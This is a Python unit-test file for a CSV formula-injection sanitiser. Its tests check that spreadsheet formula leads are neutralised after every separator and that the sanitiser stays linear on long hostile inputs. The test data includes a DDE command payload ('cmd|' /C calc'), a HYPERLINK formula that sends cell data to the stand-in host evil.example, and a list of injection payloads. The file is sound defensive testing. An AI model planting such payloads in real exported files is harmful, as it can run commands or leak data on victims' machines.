"""Unit tests for the CSV formula-injection sanitiser (GHSA-352q, CWE-1236)."""

import csv
import io
import itertools
import re
import time

from utils.csv_safe import csv_safe


def test_prefixes_every_formula_lead():
    for lead in ("=", "+", "-", "@", "\t", "\r"):
        assert csv_safe(f"{lead}cmd|' /C calc'!A0") == f"'{lead}cmd|' /C calc'!A0"


def test_passes_ordinary_text_through():
    assert csv_safe("Alice") == "Alice"
    assert csv_safe("a=b+c") == "a=b+c"  # '=' not in the leading position
    assert csv_safe("") == ""


def test_none_and_bools():
    assert csv_safe(None) == ""
    assert csv_safe(True) == "yes"
    assert csv_safe(False) == "no"


def test_server_numbers_are_not_mangled():
    # A value that arrived as a number is server-computed, never an attacker
    # formula — a negative int must stay a number, not become text.
    assert csv_safe(-5) == "-5"
    assert csv_safe(42) == "42"
    assert csv_safe(3.5) == "3.5"


def test_negative_number_string_is_still_guarded():
    # An attacker-supplied STRING beginning with '-' IS guarded (a spreadsheet
    # would evaluate "-5+3" as a formula).
    assert csv_safe("-5+3") == "'-5+3"


def test_hyperlink_exfil_payload_is_neutralised():
    payload = '=HYPERLINK("http://evil.example/?x="&A2,"details")'
    assert csv_safe(payload) == "'" + payload


# --- embedded separators (GHSA-352q-g5xh-3299) --------------------------------
# A ';'-list-separator Excel (fr/es/pl/...) splits a .csv on ';', tab-delimited
# import splits on TAB, and a CR/LF ends the row once the comma-CSV quoting has
# been misread (or by an importer that ends a row at every line break, after
# which a comma splits too) — so every segment after one of those is the start
# of a cell.

FORMULA_LEADS = ("=", "+", "-", "@")
_PHYSICAL_LINE = re.compile(r"\r\n|\r|\n")


def formula_cells(body: str) -> list[str]:
    """Every cell of a CSV export that a spreadsheet could evaluate, however the
    file is split: with the comma it was written with, a ';' list separator or
    TAB — each read quote-aware over the whole file, and again with every
    physical line as its own row. A leading TAB/CR/LF is looked past, as an
    importer may trim it (and a desynchronised parser can carry the writer's own
    row terminator into the front of a cell)."""
    found = []
    for delimiter in (",", ";", "\t"):
        whole = csv.reader(io.StringIO(body, newline=""), delimiter=delimiter)
        per_line = (
            row
            for line in _PHYSICAL_LINE.split(body)
            for row in csv.reader([line], delimiter=delimiter)
        )
        for row in itertools.chain(whole, per_line):
            found += [cell for cell in row if cell.lstrip("\t\r\n")[:1] in FORMULA_LEADS]
    return found


def test_prefixes_a_formula_lead_after_every_separator():
    # One test, not a parametrized matrix: every test pays the autouse
    # fresh-schema fixture, which 36 string-in/string-out cases don't need.
    for sep in (";", ",", "\t", "\n", "\r", "\r\n"):
        for lead in ("=", "+", "-", "@", "\t", "\r"):
            text = f"vegan{sep}{lead}1+1"
            assert csv_safe(text) == f"vegan{sep}'{lead}1+1", repr(text)


def test_neutralises_every_segment_not_just_the_first():
    assert csv_safe("a;=1;b;-2\n@3\t+4,=5") == "a;'=1;b;'-2\n'@3\t'+4,'=5"
    # The leading-position rule still applies alongside it.
    assert csv_safe("=1;=2") == "'=1;'=2"
    assert csv_safe("\t=1") == "'\t'=1"


def test_looks_through_quotes_between_separator_and_lead():
    assert csv_safe('a;"=1+1') == "a;'\"=1+1"
    assert csv_safe('a\n""=1+1') == "a\n'\"\"=1+1"
    assert csv_safe('a,"@x') == "a,'\"@x"


def test_separators_without_a_lead_are_left_alone():
    for text in (
        "1;2;3", "1,5", "a; =b", "a, -b", "line one\nline two", "x;'=1", 'a;"b"',
        "a\r\nb", "a;", "a,",
    ):
        assert csv_safe(text) == text


HOSTILE_PAYLOADS = [
    "vegan;=HYPERLINK(1)",
    "x;+1",
    "x\t-1",
    "x\n@SUM(1)",
    "x\r\n=1",
    'x;"=1',
    "x;\t=1",
    "x\nok,=1",
    "a,@b",
    'x\n"',
]


def test_written_file_has_no_formula_cell_under_any_split():
    # Write the way the export routers do (default csv.writer), every payload
    # next to every other — a line break in one cell desynchronises the quoting
    # of the cells after it — then read it back every way formula_cells does.
    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(["name", "answer"])
    for first, second in itertools.product(HOSTILE_PAYLOADS, repeat=2):
        writer.writerow([csv_safe(first), csv_safe(second)])
    assert formula_cells(buffer.getvalue()) == []


# Linear over untrusted text (the regex engine holds the GIL, so a quadratic
# pattern would stall the event loop): a 200K-character worst case is
# milliseconds linear, tens of seconds quadratic.
HOSTILE_RUNS = {
    "quote-run": ";" + '"' * 200_000,
    "separator-quote-pairs": ';"' * 100_000,
    "separator-run": ";" * 200_000,
    "comma-run": "," * 200_000,
    "tab-run": "\t" * 200_000,
    "newline-run": "\n" * 200_000,
}


def test_hostile_runs_are_linear():
    for name, text in HOSTILE_RUNS.items():
        started = time.perf_counter()
        csv_safe(text)
        assert time.perf_counter() - started < 1, name
